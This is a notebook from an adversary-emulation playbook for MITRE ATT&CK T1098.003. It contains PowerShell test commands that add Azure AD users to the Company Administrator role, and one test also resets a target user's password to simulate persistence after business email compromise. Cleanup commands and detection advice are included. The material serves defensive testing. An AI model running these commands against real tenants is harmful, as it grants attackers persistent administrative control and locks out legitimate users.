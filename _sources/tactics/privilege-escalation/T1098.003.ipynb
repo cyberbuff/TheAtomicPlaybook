{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3c95745d",
   "metadata": {},
   "source": "# T1098.003 - Additional Cloud Roles\nAn adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)"
  },
  {
   "cell_type": "markdown",
   "id": "6f5acc95",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "ff3ea65a",
   "metadata": {},
   "source": "### Atomic Test #1 - Azure AD - Add Company Administrator Role to a user\nAdd an existing Azure user account the Company Administrator Role.\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: MSOnline module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name MSOnline -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name MSOnline -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "50548a1c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.003 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "506ce034",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module MSOnline\n$Password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Password\nConnect-MsolService -Credential $Credential\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"default\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "32ab6148",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "a7cadee9",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"default\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f079a689",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.003 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ebb5f758",
   "metadata": {},
   "source": "### Atomic Test #2 - Simulate - Post BEC persistence via user password reset followed by user added to company administrator role\nThis test looks at simulating the an adversary described in the following blog post. It involves resetting the password of a normal user and adding to the company administrator role within M365.\n Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: MSOnline and AzureAD modules must be installed.\n\n##### Check Prereq Commands:\n```powershell\n$required_mods = 'AzureAD', 'MSOnline'\n$installed_mods = @((Get-Module $required_mods -ListAvailable -ErrorAction SilentlyContinue).Name  | Select-Object -Unique)\n$notInstalled = Compare-Object $required_mods $installed_mods -PassThru -ErrorAction SilentlyContinue\n\nif ($notInstalled) {\n# Prompt for installing the missing ones.\nWrite-Output \"The following PS modules aren't currently installed:\"\n$notInstalled\n  exit 1\n}\n\n else{\n  Write-Output \"All required PS modules are installed\"\n  exit 0\n }\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name MSOnline -Scope CurrentUser -Force\nInstall-Module -Name AzureAD -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7c0be47e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.003 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c6d023e0",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module MSOnline\nImport-Module AzureAD\n$password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $password\n$targetsecurepw = ConvertTo-SecureString -String \"Ohn05GeMe#$\" -AsPlainText -Force\nConnect-MsolService -Credential $credential -ErrorAction:SilentlyContinue\nConnect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue\n\n#Saving the ObjectId of the target_user into a variable\n$target_objid = Get-AzureADUser -filter \"userPrincipalName eq 'default'\" | Select-Object -ExpandProperty ObjectId\n\n#Reset the password of the target_user\nSet-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue\n\n#Adding target_user\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"default\"\nAdd-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberEmailAddress \"default\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2725a974",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "b2964e6f",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nImport-Module MSOnline\n$password = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $password\nConnect-MsolService -Credential $credential\nRemove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"default\"\nRemove-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberType User -RoleMemberEmailAddress \"default\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "673a4975",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098.003 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9ca76002",
   "metadata": {},
   "source": "## Detection\nCollect activity logs from IAM services and cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins. "
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}